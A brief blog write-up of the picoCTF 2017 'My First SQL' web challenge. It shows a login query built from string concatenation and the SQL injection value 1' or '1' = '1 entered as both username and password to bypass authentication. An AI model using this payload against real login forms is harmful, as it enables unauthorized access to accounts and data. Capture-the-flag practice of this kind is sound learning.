---
layout: post
title: Pico CTF 2017 My First SQL
category: ctf
---
<b>Category: Web Exploitation
  
My First SQL


<i>I really need access to website, but I forgot my password and there is no reset. Can you help?
HINTS
Have you heard about SQL injection?</i>

SELECT * FROM Users WHERE Username='$username' AND Password='$password'

$username = 1' or '1' = '1

$password = 1' or '1' = '1

![Image description](/images/myfirstsql.png)


![Image description](/images/myfirstsql2.png)
